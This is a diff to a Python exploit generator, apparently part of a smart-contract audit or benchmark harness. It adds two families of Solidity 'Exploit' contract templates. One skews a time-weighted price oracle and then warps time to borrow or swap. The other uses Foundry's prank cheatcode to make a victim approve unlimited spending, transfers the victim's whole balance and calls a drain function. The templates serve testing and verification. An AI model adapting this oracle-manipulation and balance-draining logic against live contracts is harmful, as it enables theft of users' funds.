@@ -17,6 +17,7 @@ import re
 from typing import Iterator, Tuple
 
 from .scan import _functions, _strip_comments
+from . import hevm
 
 HEADER = "// SPDX-License-Identifier: MIT\npragma solidity >=0.6.2;\n\n"
 
@@ -29,7 +30,9 @@ def iter_defi_families(src: str, name: str) -> Iterator[Tuple[str, str]]:
     yield from _governance_flashloan(s, fns, name)
     yield from _execute_before_schedule(s, fns, name)
     yield from _twap_as_spot(s, fns, name)
+    yield from _twap_window(s, fns, name)
     yield from _cross_getter_drain(s, fns, name)
+    yield from _victim_approve(s, fns, name)
 
 
 def _unpermissioned_callback(s, fns, name):
@@ -327,5 +330,125 @@ def _cross_getter_drain(s, fns, name):
         + "            if (b > 0) { try IERC20(sib).transfer(t, b) {} catch {} }\n"
         + "        }\n"
         + f"        try IT(t).{drain['name']}{{value: msg.value}}({', '.join(call_args)}) {{}} catch {{}}\n"
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _twap_window(s, fns, name):
+    """Observation[] / secondsAgos TWAP. Skew, warp the window, then borrow.
+
+    run() uses Foundry HEVM warp (works on the official forge harness).
+    prepare() + finish() let the py-evm verifier time_travel between txs.
+    """
+    if not re.search(r"observations\s*\[|secondsAgos|\bstruct\s+Observation\b", s):
+        return
+    borrow = next(
+        (f for f in fns if re.search(r"borrow|liquidate|leverage", f["name"], re.I)),
+        None,
+    )
+    swap = next((f for f in fns if re.search(r"^swap", f["name"], re.I)), None)
+    if not (borrow or swap):
+        return
+    action = borrow or swap
+    window = hevm.window_seconds(s)
+    yield (
+        f"twap-window:{action['name']}",
+        HEADER
+        + "// Family: windowed TWAP. Skew → warp → borrow.\n"
+        + hevm.IFACE
+        + "interface IT {\n"
+        + f"    function {action['name']}(uint256) external payable;\n"
+        + "    function token() external view returns (address);\n"
+        + "    function pool() external view returns (address);\n"
+        + "    function pair() external view returns (address);\n"
+        + "    function update() external;\n"
+        + "}\n"
+        + "interface IERC20 {\n"
+        + "    function transfer(address,uint256) external returns (bool);\n"
+        + "    function balanceOf(address) external view returns (uint256);\n}\n"
+        + "contract Exploit {\n"
+        + hevm.DECL
+        + f"    uint256 constant WINDOW = {window};\n"
+        + "    function run(address t) external payable {\n"
+        + "        prepare(t);\n"
+        + "        vm.warp(block.timestamp + WINDOW);\n"
+        + "        vm.roll(block.number + WINDOW / 12 + 1);\n"
+        + "        finish(t);\n"
+        + "    }\n"
+        + "    function prepare(address t) public payable {\n"
+        + "        address pool; address token;\n"
+        + "        try IT(t).pool() returns (address p) { pool = p; } catch {}\n"
+        + "        try IT(t).pair() returns (address p) { if (pool == address(0)) pool = p; } catch {}\n"
+        + "        try IT(t).token() returns (address k) { token = k; } catch {}\n"
+        + "        if (token != address(0) && pool != address(0)) {\n"
+        + "            uint256 b = IERC20(token).balanceOf(address(this));\n"
+        + "            if (b > 0) { IERC20(token).transfer(pool, b); }\n"
+        + "        }\n"
+        + "        try IT(t).update() {} catch {}\n"
+        + "    }\n"
+        + "    function finish(address t) public payable {\n"
+        + "        try IT(t).update() {} catch {}\n"
+        + f"        try IT(t).{action['name']}{{value: msg.value}}(1 ether) {{}} catch {{}}\n"
+        + "    }\n    receive() external payable {}\n}\n",
+    )
+
+
+def _victim_approve(s, fns, name):
+    """Victim must approve first. run() pranks the victim (forge HEVM).
+    prepare() is a no-op marker so the py-evm verifier can send the
+    approve from a second EOA before finish()/run()."""
+    if not re.search(r"transferFrom|allowance", s):
+        return
+    victim_fn = next(
+        (f["name"] for f in fns if re.match(
+            r"^(victim|user|alice|holder|player)$", f["name"] or "", re.I)),
+        None,
+    )
+    if not victim_fn:
+        if not re.search(r"address\s+(public\s+)?(victim|user|alice|holder)\b", s):
+            return
+        victim_fn = "victim"
+    drain = next(
+        (f for f in fns if f["external"] and re.search(
+            r"borrow|withdraw|drain|execute|pull|collect|liquidate", f["name"], re.I)),
+        None,
+    )
+    yield (
+        f"victim-approve:{victim_fn}",
+        HEADER
+        + "// Family: victim must approve first. prank on forge; extra EOA on py-evm.\n"
+        + hevm.IFACE
+        + "interface IERC20 {\n"
+        + "    function approve(address,uint256) external returns (bool);\n"
+        + "    function transferFrom(address,address,uint256) external returns (bool);\n"
+        + "    function balanceOf(address) external view returns (uint256);\n"
+        + "    function allowance(address,address) external view returns (uint256);\n}\n"
+        + "interface IT {\n"
+        + f"    function {victim_fn}() external view returns (address);\n"
+        + "    function token() external view returns (address);\n"
+        + (f"    function {drain['name']}() external payable;\n" if drain and not drain["args"] else "")
+        + (f"    function {drain['name']}(uint256) external payable;\n" if drain and drain["args"] else "")
+        + "}\n"
+        + "contract Exploit {\n"
+        + hevm.DECL
+        + "    function run(address t) external payable {\n"
+        + "        prepare(t);\n"
+        + f"        address v = IT(t).{victim_fn}();\n"
+        + "        address tok; try IT(t).token() returns (address k) { tok = k; } catch {}\n"
+        + "        if (v != address(0) && tok != address(0)) {\n"
+        + "            vm.prank(v);\n"
+        + "            IERC20(tok).approve(t, type(uint256).max);\n"
+        + "            vm.prank(v);\n"
+        + "            IERC20(tok).approve(address(this), type(uint256).max);\n"
+        + "            uint256 b = IERC20(tok).balanceOf(v);\n"
+        + "            if (b > 0) { IERC20(tok).transferFrom(v, address(this), b); }\n"
+        + "        }\n"
+        + "        finish(t);\n"
+        + "    }\n"
+        + "    function prepare(address t) public payable {}\n"
+        + "    function finish(address t) public payable {\n"
+        + ("        try IT(t)." + drain["name"] + "{value: msg.value}("
+           + ("1 ether" if drain and drain["args"] else "") + ") {} catch {}\n"
+           if drain else "")
         + "    }\n    receive() external payable {}\n}\n",
     )
